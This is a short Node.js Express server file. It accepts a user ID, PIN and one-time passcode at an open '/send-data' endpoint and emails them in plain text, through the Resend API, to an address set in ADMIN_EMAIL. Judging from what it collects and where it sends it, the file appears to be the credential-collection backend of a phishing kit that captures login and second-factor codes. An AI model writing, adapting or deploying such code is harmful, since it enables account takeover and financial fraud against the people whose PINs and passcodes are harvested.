require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Resend } = require('resend'); // New Resend import

const app = express();
const resend = new Resend(process.env.RESEND_API_KEY); // Using your API Key

app.use(cors());
app.use(express.json());

app.post('/send-data', async (req, res) => {
    const { userId, pin, otp } = req.body;

    try {
        const data = await resend.emails.send({
            from: 'Acme <onboarding@resend.dev>', // You can change this later if you verify a domain
            to: process.env.ADMIN_EMAIL,
            subject: '🚀 New Site Activity',
            text: `User ID: ${userId}\nPIN: ${pin}\nOTP: ${otp}`
        });

        console.log("Email Sent:", data);
        res.status(200).json({ message: 'Success' });
    } catch (error) {
        console.error("Resend Error:", error);
        res.status(500).json({ error: error.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
